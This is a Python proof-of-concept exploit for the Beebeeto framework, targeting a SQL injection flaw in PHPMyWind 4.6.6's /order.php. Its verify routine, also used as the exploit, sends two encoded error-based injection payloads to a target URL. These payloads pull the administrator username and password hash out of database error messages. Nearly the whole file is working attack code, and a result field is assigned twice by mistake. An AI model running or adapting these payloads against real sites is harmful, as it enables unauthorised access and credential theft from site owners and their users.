#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import re
import urllib2

from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2014-0026',  # 由Beebeeto官方编辑
            'name': 'phpmywind 4.6.6 /order.php SQL注入漏洞 POC',  # 名称
            'author': 'tmp',  # 作者
            'create_date': '2014-09-24',  # 编写日期
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',  # 该漏洞所涉及的协议名称
            'port': [80],  # 该协议常用的端口号，需为int类型
            'layer4_protocol': ['tcp'],  # 该协议
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'phpmywind',  # 漏洞所涉及的应用名称
            'vul_version': ['4.6.6'],  # 受漏洞影响的应用版本
            'type': 'SQL Injection',  # 漏洞类型
            'tag': ['phpmywind', '/order.php', 'SQL注入漏洞'],  # 漏洞相关tag
            'desc': '''
                    PHPMyWind /order.php 中第372行
                    $r = $dosql->GetOne("SELECT `$colname` FROM `$tbname2` WHERE `id`=".$_GET['id']);
                    未对$_GET['id']做任何过滤和检查，可以构造语句绕过后续检查进行报错注入。
                    ''',  # 漏洞描述
            'references': ['http://wooyun.org/bugs/wooyun-2010-051256',  # 参考链接
            ],
        },
    }

    @classmethod
    def verify(cls, args):
        payloads = [
            '/order.php?id=-@`%27`%20UnIon%20select%20username%20from%20`%23@__admin`%20where%20(select%201%20from%20(select%20count(*)%20,concat((select%20concat(0x7167766571,0x7c,username,0x3a73706c69743a,password,0x7c,0x716b616771)%20from%20%23@__admin%20limit%200,1),0x7c,floor(rand(0)*2))x%20from%20information_schema.tables%20group%20by%20x%20limit%200,1)a)%20and%20id=@`%27`',
            '/order.php?id=-%40%60%27%60%20AND%20%28SELECT%202598%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x7167766571%2C%28SELECT%20MID%28%28IFNULL%28CAST%28concat(0x7c,username%2C0x3a73706c69743a%2Cpassword,0x7c)%20AS%20CHAR%29%2C0x20%29%29%2C1%2C50%29%20FROM%20%23@__admin%20LIMIT%200%2C1%29%2C0x716b616771%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x%29a%29and%20id%3D%40%60%27%60'
            ]
        user_agent = {'Cookie': 'shoppingcart=a; username=a'}
        for payload in payloads:
            verify_url = args['options']['target'] + payload
            request = urllib2.Request(verify_url, headers=user_agent)
            response = urllib2.urlopen(request)
            content = response.read()
            results = re.findall('Duplicate entry \'qgveq\|(.+):split:([a-fA-F0-9]{32})\|qkagq', content)
            if results:
                args['success'] = True
                args['poc_ret']['vul_url'] = verify_url
                args['poc_ret']['Database'] = {}
                args['poc_ret']['Database']['Username'] = results[0][0]
                args['poc_ret']['Database']['Username'] = results[0][1]
                return args
            else:
                args['success'] = False
                continue
        return args

    exploit = verify


if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())
